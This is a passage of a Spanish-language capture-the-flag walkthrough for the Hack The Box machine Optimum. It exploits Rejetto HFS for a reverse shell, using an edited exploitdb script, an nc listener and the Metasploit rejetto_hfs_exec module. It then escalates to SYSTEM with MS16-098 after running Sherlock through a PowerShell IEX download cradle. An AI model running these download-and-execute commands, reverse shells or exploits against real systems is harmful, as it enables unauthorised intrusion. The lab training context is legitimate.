+							   [26]: KB2987107
+							   [27]: KB2989647
+							   [28]: KB2998527
+							   [29]: KB3000850
+							   [30]: KB3003057
+							   [31]: KB3014442
+	Network Card(s):           1 NIC(s) Installed.
+							   [01]: Intel(R) 82574L Gigabit Network Connection
+									 Connection Name: Ethernet0
+									 DHCP Enabled:    No
+									 IP address(es)
+									 [01]: 10.10.10.8
+	Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+		
+		
+
+	EL contenido de este comando copiar en un fichero llamado systeminfo.txt
+	Probar con herramienta windows-exploit-suggester.py para ver los parches instalador.
+	wget https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py
+	Actualizar el exploit.
+	python windows-exploit-suggester.py --update
+	Ejecutar el exploit:
+	Si da error de actualizacion de libreria, ejecutar: pip install xlrd
+	python windows-exploit-suggester.py --systeminfo systeminfo.txt --database 2020-05-10-mssb.xls
+	 
+	[*] initiating winsploit version 3.3...
+	[*] database file detected as xls or xlsx based on extension
+	[*] attempting to read from the systeminfo input file
+	[+] systeminfo input file read successfully (utf-8)
+	[*] querying database file for potential vulnerabilities
+	[*] comparing the 32 hotfix(es) against the 266 potential bulletins(s) with a database of 137 known exploits
+	[*] there are now 246 remaining vulns
+	[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
+	[+] windows version identified as 'Windows 2012 R2 64-bit'
+	[*] 
+	[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
+	[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
+	[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
+	[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255
+	[*] 
+	[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
+	[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)
+	[*] 
+	[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important
+	[*]   https://github.com/foxglovesec/RottenPotato
+	[*]   https://github.com/Kevin-Robertson/Tater
+	[*]   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege
+	[*]   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation
+	[*] 
+	[E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important
+	[*]   https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074), PoC
+	[*]   https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC
+	[*] 
+	[E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical
+	[*]   https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC
+	[*] 
+	[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
+	[*]   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF
+	[*]   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC
+	[*]   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC
+	[*]   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)
+	[*] 
+	[M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important
+	[*]   https://www.exploit-db.com/exploits/40085/ -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF
+	[*]   https://www.exploit-db.com/exploits/39788/ -- Microsoft Windows 7 - WebDAV Privilege Escalation Exploit (MS16-016) (2), PoC
+	[*]   https://www.exploit-db.com/exploits/39432/ -- Microsoft Windows 7 SP1 x86 - WebDAV Privilege Escalation (MS16-016) (1), PoC
+	[*] 
+	[E] MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important
+	[*]   Windows 7 SP1 x86 - Privilege Escalation (MS16-014), https://www.exploit-db.com/exploits/40039/, PoC
+	[*] 
+	[E] MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important
+	[*]   https://www.exploit-db.com/exploits/39232/ -- Microsoft Windows devenum.dll!DeviceMoniker::Load() - Heap Corruption Buffer Underflow (MS16-007), PoC
+	[*]   https://www.exploit-db.com/exploits/39233/ -- Microsoft Office / COM Object DLL Planting with WMALFXGFXDSP.dll (MS-16-007), PoC
+	[*] 
+	[E] MS15-132: Security Update for Microsoft Windows to Address Remote Code Execution (3116162) - Important
+	[*]   https://www.exploit-db.com/exploits/38968/ -- Microsoft Office / COM Object DLL Planting with comsvcs.dll Delay Load of mqrt.dll (MS15-132), PoC
+	[*]   https://www.exploit-db.com/exploits/38918/ -- Microsoft Office / COM Object els.dll DLL Planting (MS15-134), PoC
+	[*] 
+	[E] MS15-112: Cumulative Security Update for Internet Explorer (3104517) - Critical
+	[*]   https://www.exploit-db.com/exploits/39698/ -- Internet Explorer 9/10/11 - CDOMStringDataList::InitFromString Out-of-Bounds Read (MS15-112)
+	[*] 
+	[E] MS15-111: Security Update for Windows Kernel to Address Elevation of Privilege (3096447) - Important
+	[*]   https://www.exploit-db.com/exploits/38474/ -- Windows 10 Sandboxed Mount Reparse Point Creation Mitigation Bypass (MS15-111), PoC
+	[*] 
+	[E] MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important
+	[*]   https://www.exploit-db.com/exploits/38202/ -- Windows CreateObjectTask SettingsSyncDiagnostics Privilege Escalation, PoC
+	[*]   https://www.exploit-db.com/exploits/38200/ -- Windows Task Scheduler DeleteExpiredTaskAfter File Deletion Privilege Escalation, PoC
+	[*]   https://www.exploit-db.com/exploits/38201/ -- Windows CreateObjectTask TileUserBroker Privilege Escalation, PoC
+	[*] 
+	[E] MS15-097: Vulnerabilities in Microsoft Graphics Component Could Allow Remote Code Execution (3089656) - Critical
+	[*]   https://www.exploit-db.com/exploits/38198/ -- Windows 10 Build 10130 - User Mode Font Driver Thread Permissions Privilege Escalation, PoC
+	[*]   https://www.exploit-db.com/exploits/38199/ -- Windows NtUserGetClipboardAccessToken Token Leak, PoC
+	[*] 
+	[M] MS15-078: Vulnerability in Microsoft Font Driver Could Allow Remote Code Execution (3079904) - Critical
+	[*]   https://www.exploit-db.com/exploits/38222/ -- MS15-078 Microsoft Windows Font Driver Buffer Overflow
+	[*] 
+	[E] MS15-052: Vulnerability in Windows Kernel Could Allow Security Feature Bypass (3050514) - Important
+	[*]   https://www.exploit-db.com/exploits/37052/ -- Windows - CNG.SYS Kernel Security Feature Bypass PoC (MS15-052), PoC
+	[*] 
+	[M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important
+	[*]   https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC
+	[*]   https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF
+	[*] 
+	[E] MS15-010: Vulnerabilities in Windows Kernel-Mode Driver Could Allow Remote Code Execution (3036220) - Critical
+	[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows 8.1 - win32k Local Privilege Escalation (MS15-010), PoC
+	[*]   https://www.exploit-db.com/exploits/37098/ -- Microsoft Windows - Local Privilege Escalation (MS15-010), PoC
+	[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows win32k Local Privilege Escalation (MS15-010), PoC
+	[*] 
+	[E] MS15-001: Vulnerability in Windows Application Compatibility Cache Could Allow Elevation of Privilege (3023266) - Important
+	[*]   http://www.exploit-db.com/exploits/35661/ -- Windows 8.1 (32/64 bit) - Privilege Escalation (ahcache.sys/NtApphelpCacheControl), PoC
+	[*] 
+	[E] MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical
+	[*]   http://www.exploit-db.com/exploits/35474/ -- Windows Kerberos - Elevation of Privilege (MS14-068), PoC
+	[*] 
+	[M] MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution (3011443) - Critical
+	[*]   https://www.exploit-db.com/exploits/37800// -- Microsoft Windows HTA (HTML Application) - Remote Code Execution (MS14-064), PoC
+	[*]   http://www.exploit-db.com/exploits/35308/ -- Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / Powershell VirtualAlloc (MS14-064), PoC
+	[*]   http://www.exploit-db.com/exploits/35229/ -- Internet Explorer <= 11 - OLE Automation Array Remote Code Execution (#1), PoC
+	[*]   http://www.exploit-db.com/exploits/35230/ -- Internet Explorer < 11 - OLE Automation Array Remote Code Execution (MSF), MSF
+	[*]   http://www.exploit-db.com/exploits/35235/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python, MSF
+	[*]   http://www.exploit-db.com/exploits/35236/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution, MSF
+	[*] 
+	[M] MS14-060: Vulnerability in Windows OLE Could Allow Remote Code Execution (3000869) - Important
+	[*]   http://www.exploit-db.com/exploits/35055/ -- Windows OLE - Remote Code Execution 'Sandworm' Exploit (MS14-060), PoC
+	[*]   http://www.exploit-db.com/exploits/35020/ -- MS14-060 Microsoft Windows OLE Package Manager Code Execution, MSF
+	[*] 
+	[M] MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution (3000061) - Critical
+	[*]   http://www.exploit-db.com/exploits/35101/ -- Windows TrackPopupMenu Win32k NULL Pointer Dereference, MSF
+	[*] 
+	[E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important
+	[M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical
+		
+	Para encontrar rápidamente parches de software faltantes, utilizar el script sherlock.
+	Copiar el scrip en el directorio creado: www
+	wget https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1
+	Editar el fichero Sherlock.ps1 y añadir Find-Allvulns al final.
+	En la consola donde tenemos acceso como usuario C:\Users\kostas\Desktop> ejecutar:
+	powershell wget "http://10.10.14.8//Sherlock.ps1"
+	Muestra la siguiente informacion:
+	
+	StatusCode        : 200
+	StatusDescription : OK
+	Content           : {60, 35, 10, 10...}
+	RawContent        : HTTP/1.0 200 OK
+						Content-Length: 16678
+						Content-Type: application/octet-stream
+						Date: Sun, 10 May 2020 08:21:26 GMT
+						Last-Modified: Sun, 10 May 2020 08:17:24 GMT
+						Server: SimpleHTTP/0.6 Python/2.7.17...
+	Headers           : {[Content-Length, 16678], [Content-Type, application/octet-
+						stream], [Date, Sun, 10 May 2020 08:21:26 GMT], [Last-Modif
+						ied, Sun, 10 May 2020 08:17:24 GMT]...}
+	RawContentLength  : 16678
+
+	Ejecutar el script Shelock.ps1
+	
+	C:\Users\kostas\Desktop>powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.8/Sherlock.ps1')
+	powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.8/Sherlock.ps1')
+
+
+	Title      : User Mode to Ring (KiTrap0D)
+	MSBulletin : MS10-015
+	CVEID      : 2010-0232
+	Link       : https://www.exploit-db.com/exploits/11199/
+	VulnStatus : Not supported on 64-bit systems
+
+	Title      : Task Scheduler .XML
+	MSBulletin : MS10-092
+	CVEID      : 2010-3338, 2010-3888
+	Link       : https://www.exploit-db.com/exploits/19930/
+	VulnStatus : Not Vulnerable
+
+	Title      : NTUserMessageCall Win32k Kernel Pool Overflow
+	MSBulletin : MS13-053
+	CVEID      : 2013-1300
+	Link       : https://www.exploit-db.com/exploits/33213/
+	VulnStatus : Not supported on 64-bit systems
+
+	Title      : TrackPopupMenuEx Win32k NULL Page
+	MSBulletin : MS13-081
+	CVEID      : 2013-3881
+	Link       : https://www.exploit-db.com/exploits/31576/
+	VulnStatus : Not supported on 64-bit systems
+
+	Title      : TrackPopupMenu Win32k Null Pointer Dereference
+	MSBulletin : MS14-058
+	CVEID      : 2014-4113
+	Link       : https://www.exploit-db.com/exploits/35101/
+	VulnStatus : Not Vulnerable
+
+	Title      : ClientCopyImage Win32k
+	MSBulletin : MS15-051
+	CVEID      : 2015-1701, 2015-2433
+	Link       : https://www.exploit-db.com/exploits/37367/
+	VulnStatus : Not Vulnerable
+
+	Title      : Font Driver Buffer Overflow
+	MSBulletin : MS15-078
+	CVEID      : 2015-2426, 2015-2433
+	Link       : https://www.exploit-db.com/exploits/38222/
+	VulnStatus : Not Vulnerable
+
+	Title      : 'mrxdav.sys' WebDAV
+	MSBulletin : MS16-016
+	CVEID      : 2016-0051
+	Link       : https://www.exploit-db.com/exploits/40085/
+	VulnStatus : Not supported on 64-bit systems
+
+	Title      : Secondary Logon Handle
+	MSBulletin : MS16-032
+	CVEID      : 2016-0099
+	Link       : https://www.exploit-db.com/exploits/39719/
+	VulnStatus : Appears Vulnerable
+
+	Title      : Windows Kernel-Mode Drivers EoP
+	MSBulletin : MS16-034
+	CVEID      : 2016-0093/94/95/96
+	Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS1
+				 6-034?
+	VulnStatus : Appears Vulnerable
+
+	Title      : Win32k Elevation of Privilege
+	MSBulletin : MS16-135
+	CVEID      : 2016-7255
+	Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S
+				 ample-Exploits/MS16-135
+	VulnStatus : Appears Vulnerable
+
+	Title      : Nessus Agent 6.6.2 - 6.10.3
+	MSBulletin : N/A
+	CVEID      : 2017-7199
+	Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.h
+				 tml
+	VulnStatus : Not Vulnerable
+
+	Probar con MS16-098
+	searchsploit ms16-098
+	---------------------------------------------------------------------- ----------------------------------------
+	 Exploit Title                                                        |  Path
+																		  | (/usr/share/exploitdb/)
+	---------------------------------------------------------------------- ----------------------------------------
+	Microsoft Windows 8.1 (x64) - 'RGNOBJ' Integer Overflow (MS16-098)    | exploits/windows_x86-64/local/41020.c
+	Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098) (2)  | exploits/windows_x86-64/local/42435.txt
+	---------------------------------------------------------------------- ----------------------------------------
+	 
+	Ejecutar exploits/windows_x86-64/local/41020.c
+	searchsploit -m 41020.c
+	Leer el codigo e indica como descargar el esploit.
+	wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe
+	Cerrar el servicio de servidor python y ejecutar de nuevo.
+	python -m SimpleHTTPServer 80
+	En la consola que tenemos de Kostar ejecutar:
+	powershell wget "http://10.10.14.8/41020.exe" -outfile "exploit.exe"
+	Ejecutar exploit.exe
+	Se consigue una consola de administrador.
+	C:\Users\kostas\Desktop>whoami
+	whoami
+	nt authority\system
+	*Si no se consigue a la primera ejecutar nuevamente exploit.exe
+
+//////////////////////////// OPCION 2 ///////////////////////////////////////////////////////////////////
+
+	Con la aplicacion searchsploit, buscar eploit relacionado sobre el servicios HFS.
+
+	searchsploit HFS
+	[*] exec: searchsploit HFS
+
+	---------------------------------------------------------------------- ----------------------------------------
+	 Exploit Title                                                        |  Path
+																		  | (/usr/share/exploitdb/)
+	---------------------------------------------------------------------- ----------------------------------------
+	Apple Mac OSX 10.4.8 - DMG HFS+ DO_HFS_TRUNCATE Denial of Service     | exploits/osx/dos/29454.txt
+	Apple Mac OSX 10.6 - HFS FileSystem (Denial of Service)               | exploits/osx/dos/12375.c
+	Apple Mac OSX 10.6.x - HFS Subsystem Information Disclosure           | exploits/osx/local/35488.c
+	Apple Mac OSX xnu 1228.x - 'hfs-fcntl' Kernel Privilege Escalation    | exploits/osx/local/8266.txt
+	FHFS - FTP/HTTP File Server 2.1.2 Remote Command Execution            | exploits/windows/remote/37985.py
+	Linux Kernel 2.6.x - SquashFS Double-Free Denial of Service           | exploits/linux/dos/28895.txt
+	Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit | exploits/windows/remote/34926.rb
+	Rejetto HTTP File Server (HFS) 1.5/2.x - Multiple Vulnerabilities     | exploits/windows/remote/31056.py
+	Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload        | exploits/multiple/remote/30850.txt
+	Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)   | exploits/windows/remote/34668.txt
+	Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)   | exploits/windows/remote/39161.py
+	Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execut | exploits/windows/webapps/34852.txt
+	---------------------------------------------------------------------- ----------------------------------------
+	
+	Probar con Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)
+	Copiar el exploit.
+	root@kali:~/Desktop/HACKTHEBOX/Optimum_10.10.10.8# cp /usr/share/exploitdb/exploits/windows/remote/39161.py .
+	Editar y modificar.
+	ip_addr = "10.10.14.24" #local IP address    ---> IP del equipo atacante.
+        local_port = "1234" # Local Port number
+
+	Para ejecutarlo necesitamos 3 consolas.
+	
+	1. Consola para levantar un servidor ptyhon.
+	python -m SimpleHTTPServer 80
+
+	2. Consola que esta a la escucha, para conseguir una shell de la maquina atacante.
+	nc -nlvp 1234
+
+	3. Ejecutar el script.
+	python 39161.py 10.10.10.8 80
+
+	En la consola se consigue una shell como usuario, no administrador.
+	listening on [any] 1234 ...
+	connect to [10.10.14.24] from (UNKNOWN) [10.10.10.8] 49274
+	Microsoft Windows [Version 6.3.9600]
+	(c) 2013 Microsoft Corporation. All rights reserved.
+
+	C:\Users\kostas\Desktop>
+
+
+-- Elevar privilegios.
+
+	Utilizar la herramienta windows-exploit-suggester.py
+	wget https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py
+	
+	Actualizar la herramienta.
+	python windows-exploit-suggester.py -update
+	Si da error de actualizacion de libreria ejecutar: pip install xlrd
+	Ejecutar el comando systeminfo y copiar en un fichero nuevo llamado systeminfo.txt
+	
+	python windows-exploit-suggester.py --systeminfo systeminfo.txt --database 2020-05-10-mssb.xls
+	
+	[*] initiating winsploit version 3.3...
+	[*] database file detected as xls or xlsx based on extension
+	[*] attempting to read from the systeminfo input file
+	[+] systeminfo input file read successfully (utf-8)
+	[*] querying database file for potential vulnerabilities
+	[*] comparing the 32 hotfix(es) against the 266 potential bulletins(s) with a database of 137 known exploits
+	[*] there are now 246 remaining vulns
+	[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
+	[+] windows version identified as 'Windows 2012 R2 64-bit'
+	[*] 
+	[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
+	[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
+	[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
+	[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255
+	[*] 
+	[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
+	[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)
+	[*] 
+	[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important
+	[*]   https://github.com/foxglovesec/RottenPotato
+	[*]   https://github.com/Kevin-Robertson/Tater
+	[*]   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege
+	[*]   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation
+	[*] 
+	[E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important
+	[*]   https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074), PoC
+	[*]   https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC
+	[*] 
+	[E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical
+	[*]   https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC
+	[*] 
+	[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
+	[*]   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF
+	[*]   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC
+	[*]   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC
+	[*]   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)
+	[*] 
+	[M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important
+	[*]   https://www.exploit-db.com/exploits/40085/ -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF
+	[*]   https://www.exploit-db.com/exploits/39788/ -- Microsoft Windows 7 - WebDAV Privilege Escalation Exploit (MS16-016) (2), PoC
+	[*]   https://www.exploit-db.com/exploits/39432/ -- Microsoft Windows 7 SP1 x86 - WebDAV Privilege Escalation (MS16-016) (1), PoC
+	[*] 
+	[E] MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important
+	[*]   Windows 7 SP1 x86 - Privilege Escalation (MS16-014), https://www.exploit-db.com/exploits/40039/, PoC
+	[*] 
+	[E] MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important
+	[*]   https://www.exploit-db.com/exploits/39232/ -- Microsoft Windows devenum.dll!DeviceMoniker::Load() - Heap Corruption Buffer Underflow (MS16-007), PoC
+	[*]   https://www.exploit-db.com/exploits/39233/ -- Microsoft Office / COM Object DLL Planting with WMALFXGFXDSP.dll (MS-16-007), PoC
+	[*] 
+	[E] MS15-132: Security Update for Microsoft Windows to Address Remote Code Execution (3116162) - Important
+	[*]   https://www.exploit-db.com/exploits/38968/ -- Microsoft Office / COM Object DLL Planting with comsvcs.dll Delay Load of mqrt.dll (MS15-132), PoC
+	[*]   https://www.exploit-db.com/exploits/38918/ -- Microsoft Office / COM Object els.dll DLL Planting (MS15-134), PoC
+	[*] 
+	[E] MS15-112: Cumulative Security Update for Internet Explorer (3104517) - Critical
+	[*]   https://www.exploit-db.com/exploits/39698/ -- Internet Explorer 9/10/11 - CDOMStringDataList::InitFromString Out-of-Bounds Read (MS15-112)
+	[*] 
+	[E] MS15-111: Security Update for Windows Kernel to Address Elevation of Privilege (3096447) - Important
+	[*]   https://www.exploit-db.com/exploits/38474/ -- Windows 10 Sandboxed Mount Reparse Point Creation Mitigation Bypass (MS15-111), PoC
+	[*] 
+	[E] MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important
+	[*]   https://www.exploit-db.com/exploits/38202/ -- Windows CreateObjectTask SettingsSyncDiagnostics Privilege Escalation, PoC
+	[*]   https://www.exploit-db.com/exploits/38200/ -- Windows Task Scheduler DeleteExpiredTaskAfter File Deletion Privilege Escalation, PoC
+	[*]   https://www.exploit-db.com/exploits/38201/ -- Windows CreateObjectTask TileUserBroker Privilege Escalation, PoC
+	[*] 
+	[E] MS15-097: Vulnerabilities in Microsoft Graphics Component Could Allow Remote Code Execution (3089656) - Critical
+	[*]   https://www.exploit-db.com/exploits/38198/ -- Windows 10 Build 10130 - User Mode Font Driver Thread Permissions Privilege Escalation, PoC
+	[*]   https://www.exploit-db.com/exploits/38199/ -- Windows NtUserGetClipboardAccessToken Token Leak, PoC
+	[*] 
+	[M] MS15-078: Vulnerability in Microsoft Font Driver Could Allow Remote Code Execution (3079904) - Critical
+	[*]   https://www.exploit-db.com/exploits/38222/ -- MS15-078 Microsoft Windows Font Driver Buffer Overflow
+	[*] 
+	[E] MS15-052: Vulnerability in Windows Kernel Could Allow Security Feature Bypass (3050514) - Important
+	[*]   https://www.exploit-db.com/exploits/37052/ -- Windows - CNG.SYS Kernel Security Feature Bypass PoC (MS15-052), PoC
+	[*] 
+	[M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important
+	[*]   https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC
+	[*]   https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF
+	[*] 
+	[E] MS15-010: Vulnerabilities in Windows Kernel-Mode Driver Could Allow Remote Code Execution (3036220) - Critical
+	[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows 8.1 - win32k Local Privilege Escalation (MS15-010), PoC
+	[*]   https://www.exploit-db.com/exploits/37098/ -- Microsoft Windows - Local Privilege Escalation (MS15-010), PoC
+	[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows win32k Local Privilege Escalation (MS15-010), PoC
+	[*] 
+	[E] MS15-001: Vulnerability in Windows Application Compatibility Cache Could Allow Elevation of Privilege (3023266) - Important
+	[*]   http://www.exploit-db.com/exploits/35661/ -- Windows 8.1 (32/64 bit) - Privilege Escalation (ahcache.sys/NtApphelpCacheControl), PoC
+	[*] 
+	[E] MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical
+	[*]   http://www.exploit-db.com/exploits/35474/ -- Windows Kerberos - Elevation of Privilege (MS14-068), PoC
+	[*] 
+	[M] MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution (3011443) - Critical
+	[*]   https://www.exploit-db.com/exploits/37800// -- Microsoft Windows HTA (HTML Application) - Remote Code Execution (MS14-064), PoC
+	[*]   http://www.exploit-db.com/exploits/35308/ -- Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / Powershell VirtualAlloc (MS14-064), PoC
+	[*]   http://www.exploit-db.com/exploits/35229/ -- Internet Explorer <= 11 - OLE Automation Array Remote Code Execution (#1), PoC
+	[*]   http://www.exploit-db.com/exploits/35230/ -- Internet Explorer < 11 - OLE Automation Array Remote Code Execution (MSF), MSF
+	[*]   http://www.exploit-db.com/exploits/35235/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python, MSF
+	[*]   http://www.exploit-db.com/exploits/35236/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution, MSF
+	[*] 
+	[M] MS14-060: Vulnerability in Windows OLE Could Allow Remote Code Execution (3000869) - Important
+	[*]   http://www.exploit-db.com/exploits/35055/ -- Windows OLE - Remote Code Execution 'Sandworm' Exploit (MS14-060), PoC
+	[*]   http://www.exploit-db.com/exploits/35020/ -- MS14-060 Microsoft Windows OLE Package Manager Code Execution, MSF
+	[*] 
+	[M] MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution (3000061) - Critical
+	[*]   http://www.exploit-db.com/exploits/35101/ -- Windows TrackPopupMenu Win32k NULL Pointer Dereference, MSF
+	[*] 
+	[E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important
+	[M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical
+	[*] done
+
+
+	Buscar el MS16-098, en esta web:
+	https://www.exploit-db.com/exploits/41020
+	
+	Donde indica como descargar este fichero.
+	wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe
+
+	Subir el fichero
+	meterpreter> upload /root/Desktop/HACKTHEBOX/Optimum_10.10.10.8/41020.exe 
+	
+	Ejecutar
+	meterpreter> shell
+	C:\Users\kostas\Desktop>41020.exe
+	41020.exe
+	Microsoft Windows [Version 6.3.9600]
+	(c) 2013 Microsoft Corporation. All rights reserved.
+
+	C:\Users\kostas\Desktop>whoami
+	whoami
+	nt authority\system
+
+
+	
+//////////////////////////// OPCION 3 /////////////////////   
+
+	msf5 > use exploit/windows/http/rejetto_hfs_exec 
+	msf5 exploit(windows/http/rejetto_hfs_exec) > set rhosts 10.10.10.8
+	msf5 exploit(windows/http/rejetto_hfs_exec) > set payload windows/x64/meterpreter/reverse_tcp
+	msf5 exploit(windows/http/rejetto_hfs_exec) > set lhost 10.10.14.24
+	msf5 exploit(windows/http/rejetto_hfs_exec) > exploit
+
+	[*] Started reverse TCP handler on 10.10.14.11:4444 
+	[*] Using URL: http://0.0.0.0:8080/UJ5sXPNFEchNB8m
+	[*] Local IP: http://192.168.64.134:8080/UJ5sXPNFEchNB8m
+	[*] Server started.
+	[*] Sending a malicious request to /
+	[*] Payload request received: /UJ5sXPNFEchNB8m
+	[*] Sending stage (180291 bytes) to 10.10.10.8
+	[*] Meterpreter session 1 opened (10.10.14.11:4444 -> 10.10.10.8:49178) at 2020-05-07 05:05:36 -0400
+	[!] Tried to delete %TEMP%\vLEsobgfG.vbs, unknown result
+	[*] Server stopped.
+
+	meterpreter > shell
+	Process 1216 created.
+	Channel 2 created.
+	Microsoft Windows [Version 6.3.9600]
+	(c) 2013 Microsoft Corporation. All rights reserved.
+
+	C:\Users\kostas\Desktop>whoami
+	whoami
+	optimum\kostas
